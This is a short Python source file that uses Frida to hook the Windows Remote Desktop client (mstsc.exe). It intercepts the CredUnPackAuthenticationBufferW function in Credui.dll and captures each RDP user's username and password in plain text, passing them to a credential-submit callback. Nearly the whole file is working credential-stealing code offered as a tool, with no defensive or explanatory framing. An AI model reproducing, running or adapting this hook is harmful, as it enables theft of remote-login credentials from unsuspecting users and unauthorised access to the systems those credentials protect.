import frida
from PyHook import wait_for_process, on_credential_submit


def wait_for():
    wait_for_process(["mstsc.exe"], "RDP", hook)


def hook(pid):
    try:
        print("[ rdp-hook ] Trying To Attach To RDP")
        session = frida.attach(pid)
        print(f"[ rdp-hook ] Attached To RDP with pid {pid}!")

        # We Listen to the CredUnPackAuthenticationBufferW func from Credui.dll to catch the user and pass in plain text
        hook = session.create_script("""

        var username;
        var password;
        var CredUnPackAuthenticationBufferW = Module.findExportByName("Credui.dll", "CredUnPackAuthenticationBufferW")

        Interceptor.attach(CredUnPackAuthenticationBufferW, {
            onEnter: function (args) 
            {

                username = args[3];
                password = args[7];
            },
            onLeave: function (result)
            {

                var user = username.readUtf16String()
                var pass = password.readUtf16String()

                if (user && pass)
                {
                   send("\\n=============================" + "\\n[+] Intercepted Creds from RDP" + "\\nUsername    : " + user + "\\nPassword    : " + pass +"\\n=============================" );
                }
            }
        });

        """)
        hook.on('message', on_credential_submit)
        hook.load()

    except Exception as e:
        print("[ rdp-hook ] Unhandled exception: " + str(e))
        print("[ rdp-hook ] Continuing...")
